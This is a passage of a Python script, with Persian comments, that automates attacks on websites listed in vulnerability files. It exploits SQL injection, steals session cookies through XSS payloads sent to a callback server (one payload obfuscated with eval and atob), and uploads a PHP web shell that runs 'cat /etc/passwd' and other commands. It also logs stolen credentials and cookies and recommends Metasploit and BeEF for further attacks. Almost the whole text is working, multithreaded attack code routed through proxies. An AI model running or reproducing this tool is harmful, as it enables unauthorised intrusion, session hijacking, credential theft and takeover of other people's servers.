        for data in callback_data:
            if data["type"] == "OOB":
                oob_data.append(data["data"])

        extracted_data = {"tables": oob_data}
        admin_urls = find_admin_panel(url, proxy)
        usernames = []
        passwords = []

        admin_access = []
        for admin_url in admin_urls:
            success, username, password, redirect_url = test_admin_login(admin_url, usernames, passwords, proxy)
            if success:
                admin_access.append((admin_url, username, password, redirect_url))

        return extracted_data, admin_access, oob_data
    except Exception as e:
        print(f"Error exploiting {url}: {e}")
        return None, None, []

# تابع برای اکسپلویت XSS
def exploit_xss(url, vuln_type, proxy):
    try:
        input_type, input_data = identify_input_parameters(url, proxy)

        # payloadهای مختلف برای تست انواع XSS
        callback_url = "http://localhost:8080/xss?cookie="
        xss_payloads = [
            f"<script>document.location='{callback_url}'+document.cookie;</script>",  # Reflected/Stored
            f"'><script>document.location='{callback_url}'+document.cookie;</script>",  # Escaping attribute
            f"javascript:document.location='{callback_url}'+document.cookie",  # DOM-Based
            f"<img src=x onerror=document.location='{callback_url}'+document.cookie>",  # Event handler
            f"<svg onload=document.location='{callback_url}'+document.cookie>",  # SVG onload
            f"eval(atob('{base64.b64encode(f'document.location=\"{callback_url}\"+document.cookie;'.encode()).decode()}'))"  # Obfuscated
        ]

        cookies_exfiltrated = []
        for payload in xss_payloads:
            encoded_payloads = encode_payload(payload)
            for encoded_payload in encoded_payloads:
                if input_type == "url":
                    param = input_data[0]
                    test_url = url.replace(f"{param}={urllib.parse.parse_qs(urllib.parse.urlparse(url).query)[param][0]}", f"{param}={encoded_payload}")
                    response = requests.get(test_url, headers=headers, proxies=proxy, timeout=5)
                elif input_type == "form":
                    action, method, name = input_data
                    data = {name: encoded_payload}
                    if method == 'post':
                        response = requests.post(action, data=data, headers=headers, proxies=proxy, timeout=5)
                    else:
                        query = urllib.parse.urlencode(data)
                        response = requests.get(f"{action}?{query}", headers=headers, proxies=proxy, timeout=5)
                elif input_type == "cookie":
                    cookie_name = input_data[0]
                    cookies = {cookie_name: encoded_payload}
                    response = requests.get(url, headers=headers, cookies=cookies, proxies=proxy, timeout=5)

                # بررسی اینکه آیا payload اجرا شده
                if any(p in response.text for p in [payload, urllib.parse.quote(payload)]):
                    print(f"XSS payload executed on {url}")
                    break
            time.sleep(5)  # منتظر دریافت کوکی‌ها
            for data in callback_data:
                if data["type"] == "XSS" and data["cookie"] not in cookies_exfiltrated:
                    cookies_exfiltrated.append(data["cookie"])

        admin_urls = find_admin_panel(url, proxy)
        admin_access = []
        for admin_url in admin_urls:
            for cookie in cookies_exfiltrated:
                cookies = {"session": cookie}
                success, redirect_url = test_admin_login_with_cookies(admin_url, cookies, proxy)
                if success:
                    admin_access.append((admin_url, "N/A", "N/A", redirect_url))
                    break

        return cookies_exfiltrated, admin_access
    except Exception as e:
        print(f"Error exploiting XSS on {url}: {e}")
        return [], []

# تابع برای اکسپلویت RFU (Remote File Upload)
def exploit_rfu(url, vuln_type, proxy):
    try:
        # payloadهای مختلف برای آپلود فایل
        shell_content = '<?php system($_GET["cmd"]); ?>'
        shell_filename_base = f"shell_{hashlib.md5(url.encode()).hexdigest()[:8]}"
        file_variations = [
            (f"{shell_filename_base}.php", shell_content, "application/x-php"),
            (f"{shell_filename_base}.php5", shell_content, "application/x-php"),
            (f"{shell_filename_base}.phtml", shell_content, "application/x-php"),
            (f"{shell_filename_base}.jpg", f"<?php system($_GET['cmd']); ?>", "image/jpeg"),  # Fake image
            (f"{shell_filename_base}.php.jpg", shell_content, "image/jpeg"),  # Double extension
            (f"{shell_filename_base}.php%00.jpg", shell_content, "image/jpeg")  # Null byte injection
        ]

        response = requests.get(url, headers=headers, proxies=proxy, timeout=5)
        soup = BeautifulSoup(response.text, 'html.parser')
        forms = soup.find_all('form')
        upload_success = False
        shell_url = None
        system_info = None

        for form in forms:
            action = form.get('action', url)
            action = urljoin(url, action)
            method = form.get('method', 'post').lower()
            if 'enctype="multipart/form-data"' in str(form).lower():
                file_input = None
                for input_tag in form.find_all('input'):
                    if input_tag.get('type') == 'file':
                        file_input = input_tag.get('name')
                        break
                if file_input:
                    for filename, content, content_type in file_variations:
                        data = {}
                        files = {file_input: (filename, content, content_type)}
                        if method == 'post':
                            response = requests.post(action, data=data, files=files, headers=headers, proxies=proxy, timeout=5)
                        else:
                            response = requests.get(action, data=data, files=files, headers=headers, proxies=proxy, timeout=5)

                        # بررسی اینکه آیا فایل آپلود شده و قابل دسترسیه
                        possible_paths = [
                            filename,
                            f"uploads/{filename}",
                            f"files/{filename}",
                            f"media/{filename}",
                            f"tmp/{filename}",
                            filename.replace(".php%00.jpg", ".php"),
                            filename.replace(".jpg", ".php")
                        ]
                        base_url = url.rsplit("/", 1)[0]
                        for path in possible_paths:
                            test_url = urljoin(base_url, path)
                            check_response = requests.get(test_url, headers=headers, proxies=proxy, timeout=5)
                            if check_response.status_code == 200 and "system($_GET" in check_response.text:
                                upload_success = True
                                shell_url = test_url
                                break
                        if upload_success:
                            break
            if upload_success:
                break

        if upload_success and shell_url:
            # اجرای دستور برای استخراج اطلاعات سیستم
            commands = [
                "cat /etc/passwd",  # کاربران سیستم
                "whoami",  # کاربر فعلی
                "uname -a",  # اطلاعات سیستم
                "id"  # اطلاعات کاربر
            ]
            system_info = []
            for cmd in commands:
                exploit_url = f"{shell_url}?cmd={urllib.parse.quote(cmd)}"
                response = requests.get(exploit_url, headers=headers, proxies=proxy, timeout=5)
                if response.status_code == 200:
                    system_info.append(f"{cmd}: {response.text.strip()}")

        admin_urls = find_admin_panel(url, proxy)
        return upload_success, shell_url, "\n".join(system_info) if system_info else None, admin_urls
    except Exception as e:
        print(f"Error exploiting RFU on {url}: {e}")
        return False, None, None, []

# تابع کارگر برای اکسپلویت
def exploit_worker(queue, results, lock):
    while not queue.empty():
        vuln_url, vuln_type = queue.get()
        proxy = random.choice(working_proxies)
        print(f"Exploiting: {vuln_url} ({vuln_type}) using proxy {proxy['http']}")
        try:
            if "SQLi" in vuln_type:
                if "In-Band" in vuln_type or "UNION-Based" in vuln_type:
                    extracted_data, admin_access, tables = exploit_inband_union(vuln_url, vuln_type, proxy)
                elif "Time-Based" in vuln_type or "Boolean-Based" in vuln_type:
                    extracted_data, admin_access, tables = exploit_time_boolean(vuln_url, vuln_type, proxy)
                elif "Error-Based" in vuln_type:
                    extracted_data, admin_access, tables = exploit_error_based(vuln_url, vuln_type, proxy)
                elif "Second-Order" in vuln_type:
                    extracted_data, admin_access, tables = exploit_second_order(vuln_url, vuln_type, proxy)
                elif "Out-of-Band" in vuln_type:
                    extracted_data, admin_access, tables = exploit_out_of_band(vuln_url, vuln_type, proxy)
                else:
                    extracted_data, admin_access, tables = None, None, []
                with lock:
                    results.append(("SQLi", vuln_url, vuln_type, extracted_data, admin_access, tables, None, None, None))
            elif "XSS" in vuln_type:
                cookies_exfiltrated, admin_access = exploit_xss(vuln_url, vuln_type, proxy)
                with lock:
                    results.append(("XSS", vuln_url, vuln_type, None, admin_access, None, cookies_exfiltrated, None, None))
            elif "RFU" in vuln_type:
                upload_success, shell_url, system_info, admin_urls = exploit_rfu(vuln_url, vuln_type, proxy)
                with lock:
                    results.append(("RFU", vuln_url, vuln_type, None, [], None, None, upload_success, shell_url, system_info, admin_urls))
        except Exception as e:
            print(f"Error in worker for {vuln_url}: {e}")
            time.sleep(5)

# تابع برای خواندن فایل‌های vulnerabilities
def read_vulnerabilities(filename):
    vulnerabilities = []
    try:
        with open(filename, "r", encoding="utf-8") as f:
            lines = f.readlines()
            i = 0
            while i < len(lines):
                if lines[i].startswith("Vulnerable URL:"):
                    vuln_url = lines[i].split("Vulnerable URL: ")[1].strip()
                    vuln_type = lines[i + 1].split("Type: ")[1].strip() if "Type: " in lines[i + 1] else lines[i + 1].split("SQLi Type: ")[1].strip()
                    vulnerabilities.append((vuln_url, vuln_type))
                    i += 4  # رد کردن خطوط اضافی
                else:
                    i += 1
    except Exception as e:
        print(f"Error reading {filename}: {e}")
    return vulnerabilities

# تابع برای ذخیره نتایج اکسپلویت
def save_exploit_results(results):
    with open("exploited_data.txt", "w", encoding="utf-8") as f:
        for vuln_category, vuln_url, vuln_type, extracted_data, admin_access, tables, cookies_exfiltrated, upload_success, shell_url, system_info, rfu_admin_urls in results:
            f.write(f"Exploited URL: {vuln_url}\n")
            f.write(f"Vulnerability Type: {vuln_type}\n")
            if vuln_category == "SQLi":
                f.write("Extracted Data:\n")
                if extracted_data:
                    for table, data in extracted_data.items():
                        f.write(f"Table: {table}\n")
                        for username, password in data:
                            if username and password:
                                f.write(f"Username: {username}, Password: {password}\n")
                            elif username:
                                f.write(f"Email: {username}\n")
                else:
                    f.write("No data extracted.\n")
                f.write("Admin Access:\n")
                if admin_access:
                    for admin_url, username, password, redirect_url in admin_access:
                        f.write(f"Admin URL: {admin_url}, Username: {username}, Password: {password}, Redirected To: {redirect_url}\n")
                else:
                    f.write("No admin access gained.\n")
                f.write(f"Tables Found: {', '.join(tables) if tables else 'None'}\n")
                f.write("Suggestion: For further exploitation (e.g., shell upload), use Metasploit with: msfconsole -x 'use exploit/multi/http/php_cgi_arg_injection'\n")
            elif vuln_category == "XSS":
                f.write("Exfiltrated Cookies:\n")
                if cookies_exfiltrated:
                    for cookie in cookies_exfiltrated:
                        f.write(f"{cookie}\n")
                else:
                    f.write("No cookies exfiltrated.\n")
                f.write("Admin Access:\n")
                if admin_access:
                    for admin_url, _, _, redirect_url in admin_access:
                        f.write(f"Admin URL: {admin_url}, Redirected To: {redirect_url}\n")
                else:
                    f.write("No admin access gained.\n")
                f.write("Suggestion: Use the exfiltrated cookies to hijack sessions or use BeEF framework for advanced XSS exploitation.\n")
            elif vuln_category == "RFU":
                f.write("File Upload Status:\n")
                if upload_success:
                    f.write(f"Shell uploaded successfully at: {shell_url}\n")
                    f.write("System Information:\n")
                    f.write(f"{system_info if system_info else 'Could not extract system info.'}\n")
                else:
                    f.write("Failed to upload shell.\n")
                f.write("Admin URLs Found:\n")
                if rfu_admin_urls:
                    for admin_url in rfu_admin_urls:
                        f.write(f"{admin_url}\n")
                else:
                    f.write("No admin URLs found.\n")
                f.write("Suggestion: If shell uploaded, access it to execute commands or use Metasploit for further exploitation.\n")
            f.write("-" * 50 + "\n")


def auto_exploit():
    global server_thread

    server_thread = threading.Thread(target=start_callback_server, daemon=True)
    server_thread.start()
    time.sleep(2)  

    sqli_vulns = read_vulnerabilities("sqli_vulnerabilities.txt")
    xss_vulns = read_vulnerabilities("xss_vulnerabilities.txt")
    rfu_vulns = read_vulnerabilities("rfu_vulnerabilities.txt")

    all_vulns = sqli_vulns + xss_vulns + rfu_vulns
    if not all_vulns:
        print("No vulnerabilities found in input files.")
        return

    queue = Queue()
    for vuln in all_vulns:
        queue.put(vuln)

    results = []
    lock = threading.Lock()
    threads = []
    num_threads = 5  

    for _ in range(num_threads):
        t = threading.Thread(target=exploit_worker, args=(queue, results, lock))
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    save_exploit_results(results)
    print(f"Exploitation completed. Results saved to exploited_data.txt")


if __name__ == "__main__":
    print("Starting ultra-advanced SQLi, XSS, and RFU auto-exploit...")
    auto_exploit()